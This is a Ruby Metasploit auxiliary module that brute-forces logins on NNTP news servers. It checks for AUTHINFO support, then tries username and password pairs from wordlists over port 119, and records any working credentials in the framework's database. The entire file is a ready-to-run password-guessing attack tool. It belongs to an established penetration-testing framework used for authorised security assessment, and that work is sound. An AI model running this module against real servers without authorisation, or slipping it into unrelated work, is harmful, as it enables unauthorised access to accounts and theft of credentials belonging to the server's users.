##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'NNTP Login Utility',
      'Description' => %q{
        This module attempts to authenticate to NNTP services
        which support the AUTHINFO authentication extension.

        This module supports AUTHINFO USER/PASS authentication,
        but does not support AUTHINFO GENERIC or AUTHINFO SASL
        authentication methods.
      },
      'Author'      => 'Brendan Coles <bcoles[at]gmail.com>',
      'License'     => MSF_LICENSE,
      'References'  => [ [ 'CVE', '1999-0502' ], # Weak password
                         [ 'URL', 'https://tools.ietf.org/html/rfc3977' ],
                         [ 'URL', 'https://tools.ietf.org/html/rfc4642' ],
                         [ 'URL', 'https://tools.ietf.org/html/rfc4643' ] ]))
    register_options(
      [
        Opt::RPORT(119),
        OptPath.new('USER_FILE', [ false, 'The file that contains a list of probable usernames.',
          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt') ]),
        OptPath.new('PASS_FILE', [ false, 'The file that contains a list of probable passwords.',
          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt') ])
      ])
    deregister_options 'RHOST'
  end

  def run_host(ip)
    begin
      connect
      return :abort unless nntp?
      return :abort unless supports_authinfo?

      report_service :host  => rhost,
                     :port  => rport,
                     :proto => 'tcp',
                     :name  => 'nntp'
      disconnect

      each_user_pass { |user, pass| do_login user, pass }
    rescue ::Interrupt
      raise $ERROR_INFO
    rescue EOFError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error "#{peer} Connection failed"
      return
    rescue OpenSSL::SSL::SSLError => e
      print_error "SSL negotiation failed: #{e}"
    rescue => e
      print_error "#{peer} Error: #{e.class} #{e} #{e.backtrace}"
      return
    ensure
      disconnect
    end
  end

  def nntp?
    banner = sock.get_once

    if !banner
      vprint_error "#{peer} No response"
      return false
    end

    if banner !~ /^200/
      print_error 'Unexpected reply'
      return false
    end

    vprint_status 'Server is a NTTP server'
    vprint_status "Banner: #{banner}"
    true
  end

  def supports_authinfo?
    sock.put "HELP\r\n"
    res = sock.get(-1)
    code = res.scan(/\A(\d+)\s/).flatten.first.to_i

    if code.nil?
      print_error 'Server is not a NNTP server'
      return false
    end

    if code == 480
      vprint_warning 'Authentication is required before listing authentication capabilities.'
      return true
    end

    if code == 100 && res =~ /authinfo/i
      vprint_status 'Server supports AUTHINFO'
      return true
    end

    print_error 'Server does not support AUTHINFO'
    false
  end

  def do_login(user, pass)
    vprint_status "Trying username:'#{user}' with password:'#{pass}'"

    begin
      connect
      sock.get_once

      sock.put "AUTHINFO USER #{user}\r\n"
      res = sock.get_once
      unless res
        vprint_error "#{peer} No response"
        return :abort
      end

      code = res.scan(/\A(\d+)\s/).flatten.first.to_i
      if code != 381
        vprint_error "#{peer} Unexpected reply. Skipping user..."
        return :skip_user
      end

      sock.put "AUTHINFO PASS #{pass}\r\n"
      res = sock.get_once
      unless res
        vprint_error "#{peer} No response"
        return :abort
      end

      code = res.scan(/\A(\d+)\s/).flatten.first.to_i
      if code == 452 || code == 481
        vprint_error "#{peer} Login failed"
        return
      elsif code == 281
        print_good "#{peer} Successful login with: '#{user}' : '#{pass}'"
        report_cred ip:           rhost,
                    port:         rport,
                    service_name: 'nntp',
                    user:         user,
                    password:     pass,
                    proof:        code.to_s
        return :next_user
      else
        vprint_error "#{peer} Failed login as: '#{user}' - Unexpected reply: #{res.inspect}"
        return
      end
    rescue EOFError, ::Rex::ConnectionError, ::Errno::ECONNREFUSED, ::Errno::ETIMEDOUT
      print_error 'Connection failed'
      return
    rescue OpenSSL::SSL::SSLError => e
      print_error "SSL negotiation failed: #{e}"
      return :abort
    end
  rescue => e
    print_error "Error: #{e}"
    return nil
  ensure
    disconnect
  end

  def report_cred(opts)
    service_data = { address: opts[:ip],
                     port: opts[:port],
                     service_name: opts[:service_name],
                     protocol: 'tcp',
                     workspace_id: myworkspace_id }

    credential_data = { origin_type: :service,
                        module_fullname: fullname,
                        username: opts[:user],
                        private_data: opts[:password],
                        private_type: :password }.merge service_data

    login_data = { last_attempted_at: DateTime.now,
                   core: create_credential(credential_data),
                   status: Metasploit::Model::Login::Status::SUCCESSFUL,
                   proof: opts[:proof] }.merge service_data

    create_credential_login login_data
  end
end
